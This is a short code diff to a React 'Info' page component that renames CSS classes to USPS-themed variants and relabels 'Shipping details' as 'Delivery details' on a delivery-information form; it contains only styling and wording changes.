@@ -206,9 +206,9 @@ export default function Info() {
   );
 
   return (
-    <div className="alz-page">
-      <div className="alz-shell">
-        <div className="alz-top">
+    <div className="alz-page alz-usps-page">
+      <div className="alz-shell alz-usps-form-shell">
+        <div className="alz-top alz-usps-form-top">
           <div className="alz-step-head">
             <div>
               <div className="alz-badge">{BRAND.name}</div>
@@ -221,9 +221,9 @@ export default function Info() {
           </div>
         </div>
 
-        <div className="alz-flow-grid">
-          <div className="alz-card">
-            <div className="alz-section-eyebrow">Shipping details</div>
+        <div className="alz-flow-grid alz-usps-flow-grid">
+          <div className="alz-card alz-usps-form-card">
+            <div className="alz-section-eyebrow">Delivery details</div>
             <h2 className="alz-page-title">Review your delivery information</h2>
             <p className="alz-page-copy">{status}</p>
             <div className="alz-brand-row mb-2">
@@ -296,8 +296,8 @@ export default function Info() {
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
 
-          <aside className="alz-card alz-flow-aside alz-side-summary">
-            <div className="alz-side-summary-title">Shipping details</div>
+          <aside className="alz-card alz-flow-aside alz-side-summary alz-usps-side-card">
+            <div className="alz-side-summary-title">Delivery details</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb" />
               <div>
